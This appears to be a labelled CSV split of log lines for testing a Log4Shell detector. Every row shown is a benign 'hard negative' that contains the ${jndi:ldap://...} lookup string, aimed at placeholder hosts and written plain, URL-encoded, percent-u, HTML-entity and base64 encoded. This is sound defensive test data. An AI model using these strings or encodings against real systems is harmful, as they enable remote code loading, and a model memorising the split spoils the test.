id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-004297,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://playbook.local/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0144,info escaped_code_sample value='\${jndi:ldap://playbook.local/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0144,0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004298,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fplaybook.local%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-hard_negative_test-0145,get /docs/search?q=${jndi:ldap://playbook.local/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-hard_negative_test-0145,0,benign,benign_encoded_search_query,mixed,hard_negative_test,low
LS-004299,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://sample.invalid/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0146","info json_template={""example"":""\\${jndi:ldap://sample.invalid/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0146",0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004300,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'playbook.local' are shown separately for awareness trace_id=hardneg-hard_negative_test-0147,training note tokens '$' '{' 'jndi' ':ldap://' 'playbook.local' are shown separately for awareness trace_id=hardneg-hard_negative_test-0147,0,benign,benign_fragmented_tutorial_text,mixed,hard_negative_test,low
LS-004301,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://defensive-lab.example/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0148","info json_template={""example"":""\\${jndi:ldap://defensive-lab.example/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0148",0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004302,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0149","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0149",0,benign,benign_keyword_only,mixed,hard_negative_test,low
LS-004303,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0150","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0150",0,benign,benign_keyword_only,mixed,hard_negative_test,low
LS-004304,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9wbGF5Ym9vay5sb2NhbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0151,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9wbgf5ym9vay5sb2nhbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0151,0,benign,benign_base64_artifact,mixed,hard_negative_test,low
LS-004305,2026-05-17,hard_negative,JNDI configuration loaded successfully for internal naming service trace_id=hardneg-hard_negative_test-0152,jndi configuration loaded successfully for internal naming service trace_id=hardneg-hard_negative_test-0152,0,benign,keyword_only,mixed,hard_negative_test,low
LS-004306,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0153,info escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0153,0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004307,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://sample.invalid/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0154","info json_template={""example"":""\\${jndi:ldap://sample.invalid/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0154",0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004308,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fdocs.example%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-hard_negative_test-0155,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fdocs.example%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-hard_negative_test-0155,0,benign,benign_percent_u_documentation,mixed,hard_negative_test,low
LS-004309,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://kb.internal/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0156,assert literal_payload_string equals '${jndi:ldap://kb.internal/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0156,0,benign,benign_unit_test_fixture,mixed,hard_negative_test,low
LS-004310,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'defensive-lab.example' are shown separately for awareness trace_id=hardneg-hard_negative_test-0157,training note tokens '$' '{' 'jndi' ':ldap://' 'defensive-lab.example' are shown separately for awareness trace_id=hardneg-hard_negative_test-0157,0,benign,benign_fragmented_tutorial_text,mixed,hard_negative_test,low
LS-004311,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fdefensive-lab.example%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-hard_negative_test-0158,get /docs/search?q=${jndi:ldap://defensive-lab.example/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-hard_negative_test-0158,0,benign,benign_encoded_search_query,mixed,hard_negative_test,low
LS-004312,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0159","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0159",0,benign,benign_keyword_only,mixed,hard_negative_test,low
LS-004313,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fdefensive-lab.example%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-hard_negative_test-0160,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fdefensive-lab.example%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-hard_negative_test-0160,0,benign,benign_percent_u_documentation,mixed,hard_negative_test,low
LS-004314,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Ftraining.local%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-hard_negative_test-0161,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002ftraining.local%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-hard_negative_test-0161,0,benign,benign_percent_u_documentation,mixed,hard_negative_test,low
LS-004315,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fkb.internal%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-hard_negative_test-0162,get /docs/search?q=${jndi:ldap://kb.internal/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-hard_negative_test-0162,0,benign,benign_encoded_search_query,mixed,hard_negative_test,low
LS-004316,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0163,info escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0163,0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004317,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://playbook.local/sample}' render_context=documentation_only trace_id=hardneg-hard_negative_test-0164,info markdown_code_block value='${jndi:ldap://playbook.local/sample}' render_context=documentation_only trace_id=hardneg-hard_negative_test-0164,0,benign,benign_documentation_example,mixed,hard_negative_test,low
LS-004318,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://kb.internal/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0165,security_review indicator_sample='${jndi:ldap://kb.internal/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0165,0,benign,benign_scanner_report,mixed,hard_negative_test,low
LS-004319,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fplaybook.local%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-hard_negative_test-0166,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fplaybook.local%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-hard_negative_test-0166,0,benign,benign_percent_u_documentation,mixed,hard_negative_test,low
LS-004320,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://kb.internal/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0167,info escaped_code_sample value='\${jndi:ldap://kb.internal/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0167,0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004321,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0168,info escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0168,0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004322,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://defensive-lab.example/sample}' render_context=documentation_only trace_id=hardneg-hard_negative_test-0169,info markdown_code_block value='${jndi:ldap://defensive-lab.example/sample}' render_context=documentation_only trace_id=hardneg-hard_negative_test-0169,0,benign,benign_documentation_example,mixed,hard_negative_test,low
LS-004323,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;defensive-lab.example&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-hard_negative_test-0170,get /preview?html=${jndi:ldap://defensive-lab.example/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-hard_negative_test-0170,0,benign,benign_html_entity_documentation,mixed,hard_negative_test,low
LS-004324,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9wbGF5Ym9vay5sb2NhbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0171,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9wbgf5ym9vay5sb2nhbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0171,0,benign,benign_base64_artifact,mixed,hard_negative_test,low
LS-004325,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fdocs.example%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-hard_negative_test-0172,get /kb/log4shell?sample=${jndi:ldap://docs.example/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-hard_negative_test-0172,0,benign,benign_encoded_documentation,mixed,hard_negative_test,low
LS-004326,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://kb.internal/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0173","info json_template={""example"":""\\${jndi:ldap://kb.internal/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0173",0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004327,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;docs.example&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-hard_negative_test-0174,get /preview?html=${jndi:ldap://docs.example/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-hard_negative_test-0174,0,benign,benign_html_entity_documentation,mixed,hard_negative_test,low
LS-004328,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://playbook.local/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0175,info escaped_code_sample value='\${jndi:ldap://playbook.local/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0175,0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004329,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly90cmFpbmluZy5sb2NhbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0176,debug artifact payload_b64=jhtqbmrpomxkyxa6ly90cmfpbmluzy5sb2nhbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0176,0,benign,benign_base64_artifact,mixed,hard_negative_test,low
LS-004330,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0177","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0177",0,benign,benign_keyword_only,mixed,hard_negative_test,low
LS-004331,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://training.local/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0178,info escaped_code_sample value='\${jndi:ldap://training.local/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0178,0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004332,2026-05-17,hard_negative,GET /docs/log4j-mitigation HTTP/1.1 trace_id=hardneg-hard_negative_test-0179,get /docs/log4j-mitigation http/1.1 trace_id=hardneg-hard_negative_test-0179,0,benign,documentation,mixed,hard_negative_test,low
